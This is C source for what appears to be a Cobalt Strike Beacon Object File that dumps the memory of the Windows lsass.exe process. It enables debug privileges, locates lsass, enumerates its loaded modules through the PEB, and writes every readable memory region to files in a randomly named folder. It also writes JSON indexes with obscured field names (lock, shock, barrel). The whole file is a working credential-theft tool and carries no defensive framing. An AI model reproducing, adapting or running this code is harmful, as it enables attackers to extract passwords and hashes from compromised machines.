#include <windows.h>
#include "beacon.h"

#define MAX_PATH 260
#define MAX_MODULES 1024
#define ALPHANUM "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
#define ALPHANUM_SIZE (sizeof(ALPHANUM) - 1)


// Structs
typedef struct {
    char base_dll_name[MAX_PATH];
    char full_dll_path[MAX_PATH];
    void* dll_base;
    int size;
} ModuleInformation;

typedef struct {
    char filename[20];
    unsigned char* content;
    void* address;
    size_t size;
} MemFile;

typedef struct _TOKEN_PRIVILEGES_STRUCT {
    DWORD PrivilegeCount;
    LUID Luid;
    DWORD Attributes;
} TOKEN_PRIVILEGES_STRUCT;

typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;

// Functions
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$RtlGetVersion(POSVERSIONINFOW);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtOpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtAdjustPrivilegesToken(HANDLE, BOOLEAN, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtClose(HANDLE);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQueryInformationProcess(HANDLE, ULONG, PVOID, ULONG, PULONG);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtReadVirtualMemory(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtGetNextProcess(HANDLE, ACCESS_MASK, ULONG, ULONG, PHANDLE);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQueryVirtualMemory( HANDLE, PVOID, LPVOID, PVOID, SIZE_T, PSIZE_T);

DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap();
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT int    WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH,LPBOOL);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$SystemFunction036(PVOID, ULONG);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CreateDirectoryA(LPCSTR, LPSECURITY_ATTRIBUTES);

// Constants
const int zero_memory = 0x00000008;
const int max_string_length = 1024;
const int peb_offset = 0x8;
const int commandline_offset = 0x68;
const int processparameters_offset = 0x20;
const int process_basic_information_size = 48;
const int ldr_offset = 0x18;
const int inInitializationOrderModuleList_offset = 0x30;
const int flink_dllbase_offset = 0x20;
const int flink_buffer_fulldllname_offset = 0x40;
const int flink_buffer_offset = 0x50;
const ULONG ProcessBasicInformation = 0;


PVOID ReadRemoteIntPtr(HANDLE hProcess, PVOID mem_address) {
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    PVOID buff = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 8);
    SIZE_T bytesRead;
    NTSTATUS ntstatus = NTDLL$NtReadVirtualMemory(hProcess, mem_address, buff, 8, &bytesRead);
    if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "Error \n");
    }
    long long value = *(long long*)buff;
    return (PVOID)value;
}


char* ConvertUnicodeToAnsi(HANDLE hHeap, WCHAR* unicodeStr) {
    int bufferSize = KERNEL32$WideCharToMultiByte(CP_UTF8, 0, unicodeStr, -1, NULL, 0, NULL, NULL);
    if (bufferSize == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to calculate ANSI string size.\n");
        return NULL;
    }
    char* ansiStr = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, bufferSize);
    if (ansiStr == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory for ANSI string.\n");
        return NULL;
    }
    KERNEL32$WideCharToMultiByte(CP_ACP, 0, unicodeStr, -1, ansiStr, bufferSize, NULL, NULL);
    return ansiStr;    
}


char* ReadRemoteWStr(HANDLE hProcess, PVOID mem_address) {
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    PVOID buff = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 256);
    SIZE_T bytesRead;
    NTSTATUS ntstatus = NTDLL$NtReadVirtualMemory(hProcess, mem_address, buff, 256, &bytesRead);
    if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error reading remote memory. NTSTATUS: 0x%X\n", ntstatus);
        KERNEL32$HeapFree(hHeap, 0, buff);  // Clean up
    }
    WCHAR* unicodeStr = (WCHAR*)buff;

    char* ansiStr = ConvertUnicodeToAnsi(hHeap, unicodeStr);
    if (ansiStr == NULL) {
        KERNEL32$HeapFree(hHeap, 0, buff);  // Clean up
        return;
    }

    KERNEL32$HeapFree(hHeap, 0, buff);
    return ansiStr;
}


void EnableDebugPrivileges() {
    HANDLE currentProcess = (HANDLE) -1;
    HANDLE tokenHandle = NULL;
    NTSTATUS ntstatus = NTDLL$NtOpenProcessToken(currentProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &tokenHandle);
    if (ntstatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling NtOpenProcessToken. NTSTATUS: 0x%08X\n", ntstatus);
        return;
    }

    TOKEN_PRIVILEGES_STRUCT tokenPrivileges;
    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Luid.LowPart = 20;
    tokenPrivileges.Luid.HighPart = 0;
    tokenPrivileges.Attributes = SE_PRIVILEGE_ENABLED;
    ntstatus = NTDLL$NtAdjustPrivilegesToken(tokenHandle, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES_STRUCT), NULL, NULL);
    if (ntstatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x%08X\n", ntstatus);
        NTDLL$NtClose(tokenHandle);
        return;
    }

    if (tokenHandle != NULL) {
        NTDLL$NtClose(tokenHandle);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Debug privileges enabled successfully.\n");
}


char* GetProcNameFromHandle(HANDLE process_handle) {
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    PVOID pbi_addr = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, process_basic_information_size);
    if (pbi_addr == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory for process information.\n");
        return "";
    }
    
    ULONG returnLength = 0;
    NTSTATUS ntstatus = NTDLL$NtQueryInformationProcess(process_handle, ProcessBasicInformation, pbi_addr, process_basic_information_size, &returnLength);
    if (ntstatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x%08X\n", ntstatus);
        return;
    }

    // PEB 
    PVOID peb_pointer = (PVOID)((BYTE*)pbi_addr + peb_offset);
    PVOID pebaddress = *(PVOID*)peb_pointer;

    // PEB->ProcessParameters
    PVOID processparameters_pointer = (PVOID)((BYTE*)pebaddress + processparameters_offset);
    PVOID processparameters_address = ReadRemoteIntPtr(process_handle, processparameters_pointer);

    // ProcessParameters->CommandLine
    PVOID commandline_pointer = (PVOID)((BYTE*)processparameters_address + commandline_offset);
    PVOID commandline_address = ReadRemoteIntPtr(process_handle, commandline_pointer);
    char* commandline_value = ReadRemoteWStr(process_handle, commandline_address);
    return commandline_value;
}


HANDLE GetProcessByName(const char* proc_name) {
    HANDLE aux_handle = NULL;
    NTSTATUS status;
    while ((status = NTDLL$NtGetNextProcess(aux_handle, MAXIMUM_ALLOWED, 0, 0, &aux_handle)) == 0) {
        char* current_proc_name = GetProcNameFromHandle(aux_handle);
        if (current_proc_name && MyStrCmp(current_proc_name, proc_name) == 0) {
            return aux_handle;
        }
    }
    return NULL;
}


ModuleInformation* CustomGetModuleHandle(HANDLE process_handle, int* out_module_counter) {
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    PVOID pbi_addr = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, process_basic_information_size);
    if (pbi_addr == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory for process information.\n");
        return "";
    }
    
    ULONG returnLength = 0;
    NTSTATUS ntstatus = NTDLL$NtQueryInformationProcess(process_handle, ProcessBasicInformation, pbi_addr, process_basic_information_size, &returnLength);
    if (ntstatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x%08X\n", ntstatus);
        return;
    }

    PVOID peb_pointer = (PVOID)((BYTE*)pbi_addr + peb_offset);
    PVOID pebaddress = *(PVOID*)peb_pointer;
    BeaconPrintf(CALLBACK_OUTPUT, "[+] PEB Address: \t\t0x%p\n", pebaddress);

    // Get PEB->Ldr
    void* ldr_pointer = (void*)((uintptr_t)pebaddress + ldr_offset);
    void* ldr_address = ReadRemoteIntPtr(process_handle, ldr_pointer);

    // Ldr->InitializationOrderModuleList
    void* InInitializationOrderModuleList = (void*)((uintptr_t)ldr_address + inInitializationOrderModuleList_offset);
    void* next_flink = ReadRemoteIntPtr(process_handle, InInitializationOrderModuleList);
    
    KERNEL32$HeapFree(hHeap, 0, pbi_addr);
    int module_counter = 0;
    ModuleInformation* module_list = (ModuleInformation*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(ModuleInformation) * MAX_MODULES);
    if (!module_list) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to allocate memory for module_list.");
        return;
    }

    void* dll_base = (void*)1337;
    while (dll_base != NULL) {
        next_flink = (void*)((uintptr_t)next_flink - 0x10);
        // DLL base address
        dll_base = ReadRemoteIntPtr(process_handle, (void*)((uintptr_t)next_flink + flink_dllbase_offset));
        // DLL name
        void* buffer = ReadRemoteIntPtr(process_handle, (void*)((uintptr_t)next_flink + flink_buffer_offset));
        char* base_dll_name = ReadRemoteWStr(process_handle, buffer);
        // DLL full path
        void* full_dll_name_addr = ReadRemoteIntPtr(process_handle, (void*)((uintptr_t)next_flink + flink_buffer_fulldllname_offset));
        char* full_dll_path = ReadRemoteWStr(process_handle, full_dll_name_addr);
        if(dll_base != 0){
            ModuleInformation module_info;
            module_info.dll_base = dll_base;
            module_info.size = 0;
            int i;
            for (i = 0; i < MAX_PATH - 1 && base_dll_name[i] != '\0'; i++) {
                module_info.base_dll_name[i] = base_dll_name[i];
            }
            module_info.base_dll_name[i] = '\0';
            int j;
            for (j = 0; j < MAX_PATH - 1 && full_dll_path[j] != '\0'; j++) {
                module_info.full_dll_path[j] = full_dll_path[j];
            }
            module_info.full_dll_path[j] = '\0';
            module_list[module_counter] = module_info;
            module_counter++;
        }       
        next_flink = ReadRemoteIntPtr(process_handle, (void*)((uintptr_t)next_flink + 0x10));
    }
    // Return the module list
    *out_module_counter = module_counter;
    return module_list;
}


ModuleInformation find_module_by_name(ModuleInformation* moduleInformationList, int module_counter, const char* aux_name) {
    for (int i = 0; i < module_counter; i++) {
        if (MyStrCmp(moduleInformationList[i].base_dll_name, aux_name) == 0) {
            return moduleInformationList[i];
        }
    }
    return moduleInformationList[0]; // Change to empty module
}


int find_index_by_name(ModuleInformation* moduleInformationList, int module_counter, const char* aux_name) {
    for (int i = 0; i < module_counter; i++) {
        if (MyStrCmp(moduleInformationList[i].base_dll_name, aux_name) == 0) {
            return i;
        }
    }
    return -1;
}


int MyStrCmp(const char* s1, const char* s2) {
    while (*s1 && (*s1 == *s2)) {
        s1++;
        s2++;
    }
    return *(unsigned char*)s1 - *(unsigned char*)s2;
}


void MyIntToHexStr(long long value, char* buffer) {
    int i;
    for (i = 15; i >= 0; i--) {
        int nibble = value & 0xF;
        if (nibble < 10) {
            buffer[i] = '0' + nibble;
        } else {
            buffer[i] = 'A' + (nibble - 10);
        }
        value >>= 4;
    }
    buffer[16] = '\0';
}


void MyIntToStr(int value, char* buffer) {
    char temp[12];
    int i = 0;
    int is_negative = 0;
    if (value < 0) {
        is_negative = 1;
        value = -value;
    }
    do {
        temp[i++] = (value % 10) + '0';
        value /= 10;
    } while (value > 0);
    if (is_negative) {
        temp[i++] = '-';
    }
    int j = 0;
    while (i > 0) {
        buffer[j++] = temp[--i];
    }    
    buffer[j] = '\0';
}


void MyStrcpy(char* dest, const char* src, size_t max_len) {
    size_t i = 0;
    while (i < max_len - 1 && src[i] != '\0') {
        dest[i] = src[i];
        i++;
    }
    dest[i] = '\0';
}


int MyStrLen(char *str) {
    int len = 0;
    while (str[len] != '\0') {
        len++;
    }
    return len;
}


char* concatenate_strings(char* str1, char* str2) {
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    size_t len1 = MyStrLen(str1);
    size_t len2 = MyStrLen(str2);
    size_t all_len = len1 + len2 + 1;
    char* result = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, all_len);
    if (result == NULL) {
        return NULL;
    }
    for (size_t i = 0; i < len1; i++) {
        result[i] = str1[i];
    }
    for (size_t i = 0; i < len2; i++) {
        result[len1 + i] = str2[i];
    }
    result[len1 + len2] = '\0';
    return result;
}


char* create_string_with_var(char* f1, char* var1, char* f2) {
    size_t f1_len = MyStrLen(f1);
    size_t v1_len = MyStrLen(var1);
    size_t f2_len = MyStrLen(f2);
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    size_t total_len = f1_len + v1_len + f2_len + 1;  // +1 for null terminator
    char* result = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 5096);    
    if (result == NULL) {
        return NULL;
    }
    size_t offset = 0;
    for (size_t i = 0; i < f1_len; i++) {
        result[offset++] = f1[i];
    }
    for (size_t i = 0; i < v1_len; i++) {
        result[offset++] = var1[i];
    }
    for (size_t i = 0; i < f2_len; i++) {
        result[offset++] = f2[i];
    }
    result[offset] = '\0';
    return result;
}


void replace_backslash(const char* str, char* result, int result_size){
    int i, j = 0;
    for (i = 0; str[i] != '\0'; i++) {
        if (j + 2 >= result_size) {
            BeaconPrintf(CALLBACK_ERROR, "Result buffer size is too small.");
            break;
        }
        if (str[i] == '\\') {
            result[j++] = '\\';
            result[j++] = '\\';
        } 
        else {
            if (j + 1 >= result_size) {
                BeaconPrintf(CALLBACK_ERROR, "Result buffer size is too small.");
                break;
            }
            result[j++] = str[i];
        }
    }
    result[j] = '\0';
}


void write_string_to_file(char* file_path, char* data, int data_len, BOOLEAN debug) {
    // CreateFile
    HANDLE hFile = KERNEL32$CreateFileA(
        file_path,                // File path
        GENERIC_WRITE,            // Open for writing
        0,                        // Do not share
        NULL,                     // Default security
        CREATE_ALWAYS,            // Overwrite the file if it exists
        FILE_ATTRIBUTE_NORMAL,    // Normal file attributes
        NULL                      // No template file
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to create file: %s\n", file_path);
        return;
    }

    // WriteFile
    DWORD bytesWritten;
    BOOL result = KERNEL32$WriteFile(
        hFile,                    // Handle to the file
        data,                     // Pointer to the data to write
        data_len,                 // Length of the data (in bytes)
        &bytesWritten,            // Number of bytes written
        NULL                      // Overlapped not used
    );
    if (!result) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to write to file: %s\n", file_path);
    } else {
        if(debug){
            BeaconPrintf(CALLBACK_OUTPUT, "[+] File %s generated (%d bytes).\n", file_path, bytesWritten);
        }
    }

    // Close handle
    KERNEL32$CloseHandle(hFile);
}


void generate_random_string(char* buffer, int length) {
    ADVAPI32$SystemFunction036(buffer, length);
    static char charset[] = ALPHANUM;    
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    char* random_bytes = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, length * sizeof(BYTE));
    if (!ADVAPI32$SystemFunction036(random_bytes, length)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to generate random bytes.");
        KERNEL32$HeapFree(hHeap, 0, buffer);
        KERNEL32$HeapFree(hHeap, 0, random_bytes);
        return;
    }
    for (int i = 0; i < length; i++) {
        buffer[i] = charset[random_bytes[i] % ALPHANUM_SIZE];
    }
    buffer[length] = '\0';
    KERNEL32$HeapFree(hHeap, 0, random_bytes);
}


void generate_fixed_string_with_dot(char* buffer) {
    generate_random_string(buffer, 10);
    buffer[10] = '.';
    generate_random_string(buffer + 11, 3);
    buffer[14] = '\0';
}


char* get_json_barrel(MemFile* memfile_list, int memfile_count){
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    char *buffer = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 5096);
    if (buffer == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Memory allocation failed\n");
        return;
    }
    char* json_output = "[";
    for (int i = 0; i < memfile_count; i++) {
        if(i != 0){
            json_output = concatenate_strings(json_output, ", ");    
        }
        char* base_buffer[17];
        MyIntToHexStr((long long) memfile_list[i].address, base_buffer);
        char* size_buffer[12];
        MyIntToStr(memfile_list[i].size, size_buffer);
        char* buffer_name[17];
        MyIntToHexStr((long long) memfile_list[i].address, buffer_name);
        char* json_part_1 = create_string_with_var("{\"field0\":\"", buffer_name, "\",");
        char* json_part_2 = create_string_with_var("\"field1\":\"0x", base_buffer, "\",");
        char* json_part_3 = create_string_with_var("\"field2\":\"", size_buffer, "\"}");
        char* json_entry = concatenate_strings(concatenate_strings(json_part_1, json_part_2), json_part_3);
        json_output = concatenate_strings(json_output, json_entry);
    }
    json_output = concatenate_strings(json_output, "]");
    return json_output;
}


void free_concatenated_string(char* str) {
    if (str != NULL) {
        HANDLE hHeap = KERNEL32$GetProcessHeap();
        if (hHeap != NULL) {
            KERNEL32$HeapFree(hHeap, 0, str);
        }
    }
}


void dump_files(MemFile* memfile_list, int memfile_count, char* barrel_folder_name){
    for (int i = 0; i < memfile_count; i++) {
        char* aux_fname = concatenate_strings(barrel_folder_name, "\\");
        char* fname = concatenate_strings(aux_fname, memfile_list[i].filename);
        write_string_to_file(fname, memfile_list[i].content, memfile_list[i].size, FALSE);
        free_concatenated_string(aux_fname);
        free_concatenated_string(fname);
    }
}


void Barrel(char* filename, HANDLE hProcess, char* barrel_folder_name){
    long long proc_max_address_l = 0x7FFFFFFEFFFF;
    PVOID mem_address = 0;
    int aux_size = 0;
    char aux_name[MAX_PATH] = "";
     int memfile_count = 0;
    HANDLE hHeap = KERNEL32$GetProcessHeap();  
    MemFile* memfile_list = (MemFile*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(MemFile) * MAX_MODULES);

    while ((long long)mem_address < proc_max_address_l) {
        MEMORY_BASIC_INFORMATION mbi;
        SIZE_T returnSize;
        NTSTATUS ntstatus = NTDLL$NtQueryVirtualMemory(hProcess, mem_address, 0, &mbi, sizeof(mbi), &returnSize);
        if (mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT) {
            SIZE_T regionSize = mbi.RegionSize;
            PVOID buffer = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, regionSize);
            SIZE_T bytesRead = 0;     // Number of bytes actually read
            NTSTATUS ntstatus = NTDLL$NtReadVirtualMemory(hProcess, mem_address, buffer, regionSize, &bytesRead);
            if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) {
                BeaconPrintf(CALLBACK_OUTPUT, "NtReadVirtualMemory failed with status: 0x%p\n", ntstatus);
            }

            // Add to MemFile array
            MemFile memFile;
            char* buffer_name[17];
            MyIntToHexStr((long long) mem_address, buffer_name);
            MyStrcpy(memFile.filename, buffer_name, 17);
            memFile.content = (unsigned char*) buffer;
            memFile.size = mbi.RegionSize;
            memFile.address = mem_address;
            memfile_list[memfile_count++] = memFile;
        }
        mem_address = (PVOID)((ULONG_PTR)mem_address + mbi.RegionSize);
    }
    
    // Create JSON
    char* json_output = get_json_barrel(memfile_list, memfile_count);
    int data_len = MyStrLen(json_output);
    write_string_to_file(filename, json_output, data_len, TRUE);

    // Create dump files
    dump_files(memfile_list, memfile_count, barrel_folder_name);
}


char* get_json_shock(ModuleInformation* module_list, int module_counter){
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    char *buffer = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 5096);
    if (buffer == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Memory allocation failed\n");
        return;
    }

    char* json_output = "[";
    for (int i = 0; i < module_counter; i++) {
        if(i != 0){
            json_output = concatenate_strings(json_output, ", ");    
        }
        char* base_buffer[17];
        MyIntToHexStr((long long) module_list[i].dll_base, base_buffer);
        char* size_buffer[12];
        MyIntToStr(module_list[i].size, size_buffer);
        char* full_dll_path_corrected[MAX_PATH];
        replace_backslash(module_list[i].full_dll_path, full_dll_path_corrected, MAX_PATH);
        
        char* json_part_1 = create_string_with_var("{ \"field0\":\"", module_list[i].base_dll_name, "\",");
        char* json_part_2 = create_string_with_var("\"field1\":\"", full_dll_path_corrected, "\",");
        char* json_part_3 = create_string_with_var("\"field2\":\"0x", base_buffer, "\",");
        char* json_part_4 = create_string_with_var("\"field3\":\"", size_buffer, "\"}");
        char* json_part_a = concatenate_strings(json_part_1, json_part_2);
        char* json_part_b = concatenate_strings(json_part_3, json_part_4);
        char* json_entry = concatenate_strings(json_part_a, json_part_b);
        json_output = concatenate_strings(json_output, json_entry);
    }
    json_output = concatenate_strings(json_output, "]");
    KERNEL32$HeapFree(hHeap, 0, buffer);
    return json_output;
}

    
void Shock(char* filename, HANDLE* hProcessOutput){
    EnableDebugPrivileges();
    HANDLE hProcess = GetProcessByName("C:\\WINDOWS\\system32\\lsass.exe");
    *hProcessOutput = hProcess;
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Process handle: \t\t%d\n", hProcess);
    int module_counter = 0;
    ModuleInformation* module_list = CustomGetModuleHandle(hProcess, &module_counter);    
    long long proc_max_address_l = 0x7FFFFFFEFFFF;
    PVOID mem_address = 0;
    int aux_size = 0;
    char aux_name[MAX_PATH] = "";

    while ((long long)mem_address < proc_max_address_l) {
        // Populate MEMORY_BASIC_INFORMATION struct
        MEMORY_BASIC_INFORMATION mbi;
        SIZE_T returnSize;
        NTSTATUS ntstatus = NTDLL$NtQueryVirtualMemory(hProcess, mem_address, 0, &mbi, sizeof(mbi), &returnSize);

        // If readable and committed --> Get information
        if (mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT) {
            // Find the module by name
            ModuleInformation aux_module = find_module_by_name(module_list, module_counter, aux_name);

            if (mbi.RegionSize == 0x1000 && mbi.BaseAddress != aux_module.dll_base) {
                aux_module.size = aux_size;
                // Find module index
                int aux_index = find_index_by_name(module_list, module_counter, aux_name);
                module_list[aux_index] = aux_module;

                for (int k = 0; k < module_counter; k++) {
                    if (mbi.BaseAddress == module_list[k].dll_base) {                        
                        MyStrcpy(aux_name, module_list[k].base_dll_name, MAX_PATH);
                        aux_size = (int)mbi.RegionSize;
                    }
                }
            }
            else {
                aux_size += (int)mbi.RegionSize;
            }
        }
        mem_address = (PVOID)((ULONG_PTR)mem_address + mbi.RegionSize);
    }

    char* json_output = get_json_shock(module_list, module_counter);
    int json_output_len = MyStrLen(json_output);
    write_string_to_file(filename, json_output, json_output_len, TRUE);
}


void Lock(char* filename){
    OSVERSIONINFOW osvi;
    NTSTATUS status = NTDLL$RtlGetVersion(&osvi);
    if (status == 0) {
        char* majorversion_buffer[12];
        MyIntToStr(osvi.dwMajorVersion, majorversion_buffer);
        char* minorversion_buffer[12];
        MyIntToStr(osvi.dwMinorVersion, minorversion_buffer);
        char* buildnumber_buffer[12];
        MyIntToStr(osvi.dwBuildNumber, buildnumber_buffer);
        char* json_part_1 = create_string_with_var("{ \"field0\": \"", majorversion_buffer, "\", ");
        char* json_part_2 = create_string_with_var("\"field1\": \"", minorversion_buffer, "\", ");        
        char* json_part_3 = create_string_with_var("\"field2\": \"", buildnumber_buffer, "\"}");
        char* json_entry = concatenate_strings(concatenate_strings(json_part_1, json_part_2), json_part_3);
        char* json_output = concatenate_strings(concatenate_strings("[", json_entry), "]");
        int json_output_len = MyStrLen(json_output);
        write_string_to_file(filename, json_output, json_output_len, TRUE);
    }
}


void go() {
    char* filename_lock   = "lock.json";
    char* filename_shock  = "shock.json";
    char* filename_barrel = "barrel.json";    
    HANDLE hProcess;

    // Create folder with random name (or you can set a fixed folder name)
    char* barrel_folder_name[10];
    generate_random_string(barrel_folder_name, 10);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Created folder: \t\t%s\n", barrel_folder_name);
    KERNEL32$CreateDirectoryA(barrel_folder_name, NULL);

    Lock(filename_lock);
    Shock(filename_shock, &hProcess);
    Barrel(filename_barrel, hProcess, barrel_folder_name);
}